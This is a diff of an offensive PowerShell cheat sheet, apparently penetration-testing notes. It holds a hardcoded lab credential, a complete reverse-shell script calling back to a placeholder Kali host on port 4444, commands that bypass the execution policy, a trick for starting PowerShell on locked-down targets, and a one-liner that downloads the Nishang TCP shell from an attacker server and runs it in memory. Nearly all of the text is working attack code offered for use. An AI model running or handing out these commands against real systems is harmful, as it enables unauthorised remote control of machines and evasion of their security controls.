@@ -2,16 +2,16 @@
 
 ## credentials
 
-```
+```powershell
 $user = 'TESTLAB\dfm.a'
 $pwd = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
 $cred = New-Object System.Management.Automation.PSCredential($user, $pwd)
 ```
 
-
 ## shell
 
 revshell.ps1
+
 ```powershell
 $c = New-Object System.Net.Sockets.TCPClient("<KALI IP>","4444");
 $I = $c.GetStream();[byte[]]$U = 0..(2-shl15)|%{0};
@@ -22,23 +22,39 @@ $a = (iex $D 2>&1 | Out-String ); $r  = $a + (pwd).Path + '> '; $m = ([text.enco
 $I.Write($m,0,$m.Length); $I.Flush()}; $c.Close();
 ```
 
-Exec file
-```
-powershell -nop -exec Bypass -File revshell.ps1
+Execution Policy
+
+```powershell
+Get-ExecutionPolicy
+Set-ExecutionPolicy unrestricted
 ```
 
+Exec file
+
+```powershell
+powershell.exe -noprofile -executionpolicy bypass -File revshell.ps1
+```
+
+Powershell startup on locked targets
+
+- create `.txt` file with the following content and rename file to `.cmd` or `.bat`
+
+```powershell
+powershell.exe -noprofile -executionpolicy bypass
+```
 
 Execute download direct on memory
-```
+
+```powershell
 cd /opt/nishang/Shells/
 sudo python -m http.server 80
 ```
 
-```
+```powershell
 powershell iex (New-Object Net.WebClient).DownloadString('http://<Kali IP>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.]
 ```
 
-
-# Links
+## Links
 
 [PowerShell-Reverse-Shells](https://github.com/0x10F8/PowerShell-Reverse-Shells)
+[PowerShell - no profile & execution policy](https://superuser.com/a/533745)
